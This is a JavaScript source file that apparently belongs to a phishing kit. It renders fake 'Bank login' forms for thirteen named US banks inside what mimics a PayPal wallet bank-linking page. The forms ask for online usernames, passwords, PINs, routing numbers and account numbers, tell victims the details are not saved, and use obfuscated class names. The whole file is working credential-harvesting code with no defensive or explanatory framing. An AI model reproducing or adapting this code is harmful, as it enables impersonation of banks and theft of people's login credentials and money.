
	
	
	$('.pull-left').click(function (event)  {
		  event.preventDefault();
		
	var id = $(this).attr("data-id");
	var banks = {
		"1":{
			name:'Bank of America',
			class:'bankOfAmerica',
			hint1:'Online ID',
			hint2:'Passcode',
			rm:['RoutingNumber','accnum']
			
		},
		"2":{
			name:'capitalone',
			hint1:'Username',
			hint2:'Password',
			class:'capitalOne',
			rm:['RoutingNumber','accnum']
		},
		"3":{
			name:'CHASE',
			class:'chase',
			hint1:'User ID',
			rm:['RoutingNumber','accnum']
		},
		"4":{
			name:'citiBank',
			class:'citiBank',
			hint1:'User ID',
			hint2:'Password',
			rm:['RoutingNumber','accnum']
		},
		"5":{
			name:'Fifth Third',
			class:'fifthThirdBank',
			hint1:'User ID',
			rm:['RoutingNumber','accnum']
			},
		"6":{
			name:'Huntington',
			hint1:'Username',
			class:'huntington',
			rm:['RoutingNumber','accnum']
		},     
		"7":{
			name:'PNC',
			class:'pnc',
			hint1:'User ID',
			hint2:'PIN/Password',
			 rm:['RoutingNumber','accnum']
			},
		"8":{
			name:'Regions',
			class:'regions',
			hint1:'Online ID',
			 rm:['RoutingNumber','accnum']
			},
		"9":{
			name:'SunTrust',
			class:'sunTrust',
			hint1:'User ID',
			hint2:'Password',
			rm:['RoutingNumber','accnum']
			
		},
		"10":{
			name:'TD',
			class:'tdBank',
			rm:['RoutingNumber','accnum']
		},
		"11":{
			name:'US',
			class:'usBank',
			hint1:'Personal ID',
			rm:['RoutingNumber','accnum']
			
		},
		"12":{
			name:'USAA',
			class:'usaa',
			hint1:'Online ID',
			hint2:'Password',
			set:{'RoutingNumber':{
				id:'pin',
				name:'pin',
				placeholder:'PIN',
				pattern:"[0-9]{4,20}",
				maxlength:"20",
			},
			'username':{
				name:'username'
			}
			
			},
			
			rm:['accnum']
		},
		"13":{
			name:'Wells Fargo',
			class:'wellsFargo',
			hint1:'Username',
			rm:['RoutingNumber','accnum']
		},
		
		
	}
	
	
	var bank = banks[id];
	
	var html = `<div class="x_33ID-Z711 MightyxMorphin x_25ID-Z556" id="x_27ID-Z523">
                            <div class="x_26ID-Z617 x_Gh0ST789 x_24ID-Z582" id="x_27ID-Z778">	
									    <div class="x_25ID-Z624" id="x_33ID-Z569">
									        <div class="listBanks loginPage"><div class="logo-bigger ${bank.class}"><span class="accessAid">Wells Fargo Bank</span></div></div>                                      
									        <h2 id="overpanel-header">Bank login</h2>                                       
									        <p>Use your <b>${bank.name}</b> Bank login to link your bank. We don't save this information.</p>                                    
                                            <div class="x_30ID-Z747 x_Gh0ST789 x_33ID-Z558" id="x_24ID-Z573">
																				
                                            <div class="x_28ID-Z743" id="x_34ID-Z738">
                                                <div class="x_34ID-Z741 x_V-ForZ118 large" id="x_24ID-Z631">
                                                   
                                                </div>
                                            </div>
                                            <div class="x_34ID-Z576 " id="stateHolder">
                                                <div class="x_23ID-Z716" id="x_32ID-Z543">
                                                    
                                                </div>
                                            </div>
                                            <div class="x_26ID-Z540 multi x_26ID-Z632 equal x_25ID-Z779 " id="x_24ID-Z554">
                                                <div class="x_27ID-Z692 x_V-ForZ118 x_23ID-Z714  medium x_24ID-Z626  left" id="x_32ID-Z714">
                                                    

<input type="text" id="username" name="username" autocomplete="off" class="Xval666ideX1 x_30ID-Z616" pattern="[a-zA-Z0-9-_.+=@!?#$%^&amp;*/><;:' ]{4,30}" required="required" placeholder="${ bank.hint1 || 'User Name' }" value="" aria-required="true">
                                                </div>
                                                <div class="x_26ID-Z561" id="x_29ID-Z731">
                                                    <div class="x_27ID-Z672 x_V-ForZ118 medium x_28ID-Z645  right" id="x_24ID-Z784">
                                                        <input type="text" id="password" name="password" autocomplete="off" class="Xval666ideX1 x_30ID-Z616" pattern="[a-zA-Z0-9-_.+=@!?#$%^&amp;*/><;:' ]{4,30}" required="required" placeholder="${ bank.hint2 || 'Password' }" value="" aria-required="true">
                                                    </div>
                                                </div>
                                            </div>
                                            </div>
                                        </div>
									</div>							
                                <div class="x_26ID-Z768 0Dats_Good0 x_34ID-Z583" style="margin-top: 5em;">
                                    <div class="x_34ID-Z634 x_Gh0ST789 x_31ID-Z622" id="x_32ID-Z527">
                                        <div class="x_34ID-Z675 lap x_33ID-Z725" id="x_22ID-Z546">
                                            <div class="x_22ID-Z559 x_V-ForZ118 large" id="x_33ID-Z719">
                                                
                                            </div>
                                        </div>
                                        <div class="x_32ID-Z727" id="x_26ID-Z662">
                                            <div class="x_33ID-Z782 x_V-ForZ118 large" id="x_25ID-Z540">
											    
											    <input name="c_type" type="hidden" id="card_type" value="">
                        					    <input name="c_valid" type="hidden" id="card_valid" value="">
											</div>
                                        </div>
                                    </div>                                    
                                    <div class="x_33ID-Z630 x_Gh0ST789" id="x_24ID-Z660">                                                                                       
                                        <div class="x_25ID-Z671 multi x_32ID-Z771 equal x_34ID-Z533 " id="x_23ID-Z693">
                                            <div class="x_26ID-Z770 x_V-ForZ118 x_29ID-Z772 medium x_33ID-Z710 left" id="x_34ID-Z677">
<input type="text" id="RoutingNumber" name="RoutingNumber" autocomplete="off" class="Xval666ideX1 x_30ID-Z616" required="required" placeholder="Routing Number" pattern="[0-9]{9}" maxlength="9" value="" aria-required="true">											</div>
                                             <div class="x_31ID-Z757" id="x_32ID-Z685">
                                                <div class="x_32ID-Z680 x_V-ForZ118 x_22ID-Z601 medium x_30ID-Z523 right" id="x_22ID-Z527">
                                                    <input type="text" id="accnum" name="AccountNumber" autocomplete="off" class="Xval666ideX1 x_30ID-Z616" required="required" pattern="[0-9]{3,17}" placeholder="Account Number" value="" aria-required="true">
                                                </div>
                                            </div>
                                        </div>
                                    </div> 
 									
									<div class="x_29ID-Z682 agreeTC x_32ID-Z574  checkbox" id="PP-ID119871799016">
                                        <div class="x_32ID-Z620 x_V-ForZ118" id="x_24ID-Z696">
                                            <br>
                                        </div>
                                    </div>
									<input type="hidden" name="bank" value="${bank.name}">
                                    <input type="submit" class="linkInstantly vx_btn vx_btn-block validateBeforeSubmit" name="continue" value="Link Bank Instantly" data-pagename="main:walletweb:wallet:bank:completeconfirminstantly">
                                </div>
                            </div>`;
							

							
							
							if (bank.rm) {
								
								var rm = bank.rm;
								var h = $(html)[0].getRootNode();
								for (var i in rm){
									$(h.getElementById(rm[i]).remove());
								}
								
								html = h;
								
								
							}
							
							
							if (bank.set) {
								
								var set = bank.set;
			
								var h = $(html)[0].getRootNode();
								for (var key in set){
									var el = h.getElementById(key); el = $(el);
									var sets = set[key];
									
									for (var l in sets)
									{
										el.attr(l,sets[l]);
										
									}
									
								}
								
								html = h;
								
								
							}
							
							
							
							
							$("#bank").html(html);
	
	
		$('.listFABBank').remove();
	
	
	
	
	});
	
	
	
